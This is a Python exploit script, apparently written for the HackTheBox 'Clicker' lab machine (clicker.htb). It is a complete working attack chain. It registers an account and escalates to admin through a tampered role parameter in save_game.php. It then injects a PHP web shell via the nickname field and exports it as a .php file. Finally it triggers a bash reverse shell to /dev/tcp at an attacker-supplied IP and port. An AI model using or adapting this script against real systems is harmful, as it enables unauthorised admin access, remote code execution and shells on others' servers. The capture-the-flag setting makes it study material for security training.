import requests
import re
import sys
import random
from urllib.parse import urljoin

# Check and assign arguments
if len(sys.argv) != 3:
    print("Usage: python3 click.py <your_ip> <port>")
    sys.exit(1)
try:
    your_ip, port = sys.argv[1], int(sys.argv[2])
    if not your_ip or port <= 0:
        print("Invalid arguments: IP cannot be empty, and port must be a positive integer.")
        print("Usage: python3 click.py <your_ip> <port>")
        sys.exit(1)
except ValueError:
    print("Invalid port number: Port must be an integer.")
    print("Usage: python3 click.py <your_ip> <port>")
    sys.exit(1)

# Base URL and session setup
BASE_URL = "http://clicker.htb/"
session = requests.Session()

def run_exploit():
    # Generate random username/password
    random_username = ''.join(chr(random.randrange(97, 123)) for _ in range(5))
    credentials = {"username": random_username, "password": random_username}

    # Register a new user
    print("Registering new account...")
    register_response = session.post(urljoin(BASE_URL, "create_player.php"), data=credentials)
    if register_response.status_code != 200:
        print(f"Registration failed with status: {register_response.status_code}")
        sys.exit(1)
    print(f"Registered successfully. Username/Password: {random_username}")

    # Log in with the created credentials
    print("Logging in...")
    login_response = session.post(urljoin(BASE_URL, "authenticate.php"), data=credentials, allow_redirects=True)
    if login_response.status_code != 200:
        print(f"Login failed with status: {login_response.status_code}")
        sys.exit(1)
    print("Logged in successfully!")

    # Attempt to escalate to admin privileges
    print("Attempting to gain admin access...")
    admin_response = session.get(urljoin(BASE_URL, "save_game.php?role%3d'Admin',clicks=0&level=0"), allow_redirects=True)
    if admin_response.status_code != 200:
        print(f"Admin escalation failed with status: {admin_response.status_code}")
        sys.exit(1)
    session.get(urljoin(BASE_URL, "logout.php"), allow_redirects=True)
    login_response = session.post(urljoin(BASE_URL, "authenticate.php"), data=credentials, allow_redirects=True)
    if login_response.status_code != 200:
        print(f"Admin login failed with status: {login_response.status_code}")
        sys.exit(1)
    print("Admin access granted!")

    # Create and connect a reverse shell
    print("Creating PHP shell...")
    shell_response = session.get(urljoin(BASE_URL, "save_game.php?clicks=4&level=0&nickname=<%3fphp+system($_REQUEST['cmd'])%3b+%3f>"), allow_redirects=True)
    if shell_response.status_code !=200:
        print(f"Shell creation failed with status: {shell_response.status_code}")
        sys.exit(1)
    else:
        print("exporting shell...")
        export_response = session.post(urljoin(BASE_URL, "export.php"), data={"threshold": "1000000", "extension": "php"}, headers={"Referer": "http://clicker.htb/admin.php"},  allow_redirects=True)
    if export_response.status_code != 200:
        print(f"Export failed with status: {export_response.status_code}")
        sys.exit(1)
    else:
        if match := re.search(r"exports/top_players_\w+\.php", export_response.text):
            endpoint = match.group(0)
            shell_payload = f"?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/{your_ip}/{port}%200%3E%261%27"
            shell_url = urljoin(BASE_URL, f"{endpoint}{shell_payload}")
            session.get(shell_url)
            print("Reverse shell connected successfully!")
        else:
            print("Failed to find endpoint in response")
            sys.exit(1)

run_exploit()
